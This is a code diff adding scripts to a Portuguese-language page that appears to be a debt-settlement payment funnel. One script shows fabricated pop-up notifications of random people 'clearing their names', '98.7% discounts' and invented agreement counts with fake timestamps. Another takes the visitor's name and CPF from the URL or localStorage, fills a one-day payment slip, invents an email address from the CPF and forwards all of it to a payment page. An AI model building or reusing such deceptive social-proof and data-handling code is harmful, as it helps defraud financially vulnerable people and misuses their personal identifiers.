+      const tempos = ['agora', 'h\u00e1 1 min', 'h\u00e1 2 min', 'h\u00e1 3 min', 'h\u00e1 5 min', 'h\u00e1 8 min'];
+
+      const svgCheck = '<svg viewBox="0 0 24 24" fill="none" stroke="#16a34a" stroke-width="2.5"><polyline points="20 6 9 17 4 12"/></svg>';
+      const svgTrend = '<svg viewBox="0 0 24 24" fill="none" stroke="#2563eb" stroke-width="2"><polyline points="23 6 13.5 15.5 8.5 10.5 1 18"/><polyline points="17 6 23 6 23 12"/></svg>';
+      const svgPin = '<svg viewBox="0 0 24 24" fill="none" stroke="#d97706" stroke-width="2"><path d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0118 0z"/><circle cx="12" cy="10" r="3"/></svg>';
+      const svgUsers = '<svg viewBox="0 0 24 24" fill="none" stroke="#7c3aed" stroke-width="2"><path d="M17 21v-2a4 4 0 00-4-4H5a4 4 0 00-4 4v2"/><circle cx="9" cy="7" r="4"/><path d="M23 21v-2a4 4 0 00-3-3.87"/><path d="M16 3.13a4 4 0 010 7.75"/></svg>';
+      const svgShield = '<svg viewBox="0 0 24 24" fill="none" stroke="#059669" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/><polyline points="9 12 11 14 15 10"/></svg>';
+
+      function rp() { return pessoas[Math.floor(Math.random() * pessoas.length)]; }
+
+      const notificacoes = [
+        { type: 'pessoa', msg: (p) => `<strong>${p.nome}</strong> realizou o pagamento do acordo` },
+        { type: 'pessoa', msg: (p) => `<strong>${p.nome}</strong> limpou o nome agora` },
+        { type: 'pessoa', msg: (p) => `<strong>${p.nome}</strong> regularizou o CPF pelo PIX` },
+        { type: 'pessoa', msg: (p) => `<strong>${p.nome}</strong> obteve desconto de 98,7%` },
+        { type: 'pessoa', msg: (p) => `<strong>${p.nome}</strong> removeu todas as restri\u00e7\u00f5es` },
+        { type: 'icone', svg: svgUsers, bg: '#ede9fe', msg: () => `<strong>1.187 pessoas</strong> quitaram acordos hoje` },
+        { type: 'icone', svg: svgTrend, bg: '#dbeafe', msg: () => `Mais de <strong>10.000 acordos</strong> firmados nesta semana` },
+        { type: 'icone', svg: svgPin, bg: '#fef3c7', msg: () => { const c = cidades[Math.floor(Math.random()*cidades.length)]; return `Novo acordo pago em <strong>${c}</strong>`; } },
+        { type: 'icone', svg: svgShield, bg: '#dcfce7', msg: () => `<strong>99,2%</strong> dos acordos confirmados em menos de 5 minutos` },
+        { type: 'icone', svg: svgCheck, bg: '#dcfce7', msg: () => `<strong>328 nomes</strong> limpos somente nas \u00faltimas 2 horas` },
+      ];
+
+      const toast = document.getElementById('fomo-toast');
+      const iconWrap = document.getElementById('fomo-icon-wrap');
+      const textEl = document.getElementById('fomo-text');
+      const timeEl = document.getElementById('fomo-time');
+      let idx = 0;
+
+      function shuffle(arr) {
+        for (let i = arr.length - 1; i > 0; i--) {
+          const j = Math.floor(Math.random() * (i + 1));
+          [arr[i], arr[j]] = [arr[j], arr[i]];
+        }
+        return arr;
+      }
+
+      const ordem = shuffle([...Array(notificacoes.length).keys()]);
+
+      function showNext() {
+        const n = notificacoes[ordem[idx % ordem.length]];
+
+        if (n.type === 'pessoa') {
+          const p = rp();
+          iconWrap.innerHTML = '<div class="fomo-avatar" style="background:' + p.cor + '">' + p.iniciais + '</div>';
+          textEl.innerHTML = n.msg(p);
+        } else {
+          iconWrap.innerHTML = '<div class="fomo-svg-icon" style="background:' + n.bg + '">' + n.svg + '</div>';
+          textEl.innerHTML = n.msg();
+        }
+
+        timeEl.textContent = tempos[Math.floor(Math.random() * tempos.length)];
+        toast.classList.add('show');
+
+        setTimeout(() => { toast.classList.remove('show'); }, 4500);
+        idx++;
+      }
+
+      setTimeout(() => {
+        showNext();
+        setInterval(showNext, 7000);
+      }, 5000);
+    })();
+  </script>
+
+  <script>
+    // Ano no footer
+    document.getElementById('y').textContent = new Date().getFullYear();
+
+    // Dados do usuario (localStorage ou URL params)
+    (function() {
+      const urlParams = new URLSearchParams(window.location.search);
+
+      // Nome
+      const nome = urlParams.get('nome') || localStorage.getItem('userName') || '';
+      // CPF
+      const cpf = urlParams.get('cpf') || localStorage.getItem('userCPF') || '';
+
+      // Header
+      if (nome) {
+        const partes = nome.trim().split(/\s+/);
+        const exibir = partes.length > 1 ? partes[0] + ' ' + partes[partes.length - 1] : partes[0];
+        document.getElementById('user-display-name').textContent = exibir;
+      }
+      if (cpf) {
+        const limpo = cpf.replace(/\D/g, '');
+        const mascarado = limpo.slice(0,3) + '.\u2022\u2022\u2022.\u2022\u2022\u2022-' + limpo.slice(-2);
+        document.getElementById('user-display-cpf-header').textContent = mascarado;
+      }
+
+      // Guia - Nome completo
+      document.getElementById('guia-nome').textContent = nome || '---';
+
+      // Guia - CPF formatado
+      if (cpf) {
+        const limpo = cpf.replace(/\D/g, '');
+        const formatado = limpo.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
+        document.getElementById('guia-cpf').textContent = formatado;
+      }
+
+      // Data de emissão (hoje)
+      const hoje = new Date();
+      const hojeStr = hoje.toLocaleDateString('pt-BR');
+      document.getElementById('guia-data').textContent = hojeStr;
+      document.getElementById('guia-data-topo').textContent = hojeStr;
+
+      // Validade (hoje + 1 dia)
+      const validade = new Date(hoje);
+      validade.setDate(validade.getDate() + 1);
+      document.getElementById('guia-validade').textContent = validade.toLocaleDateString('pt-BR');
+    })();
+
+    // Botão Gerar Pagamento -> redireciona para /pagamento/ passando os params
+    document.getElementById('btn-gerar-pagamento').addEventListener('click', function(e) {
+      e.preventDefault();
+      if (this._clicked) return;
+      this._clicked = true;
+      const currentParams = new URLSearchParams(window.location.search);
+      const targetUrl = new URL('/pagamento/', window.location.origin);
+
+      // Repassa todos os parametros da URL atual
+      currentParams.forEach(function(value, key) {
+        targetUrl.searchParams.set(key, value);
+      });
+
+      // Garante que nome e cpf estejam presentes (do localStorage se nao estiverem na URL)
+      if (!targetUrl.searchParams.get('nome')) {
+        const nome = localStorage.getItem('userName');
+        if (nome) targetUrl.searchParams.set('nome', nome);
+      }
+      if (!targetUrl.searchParams.get('cpf')) {
+        const cpf = localStorage.getItem('userCPF');
+        if (cpf) targetUrl.searchParams.set('cpf', cpf);
+      }
+      // Garante que email esteja presente (gera baseado no CPF se nao fornecido)
+      if (!targetUrl.searchParams.get('email')) {
+        const cpfEmail = (targetUrl.searchParams.get('cpf') || localStorage.getItem('userCPF') || '').replace(/\D/g,'');
+        if (cpfEmail) targetUrl.searchParams.set('email', cpfEmail + '@gmail.com');
+      }
+
+      window.location.href = targetUrl.toString();
+    });
+  </script>
+
+
+</body></html>
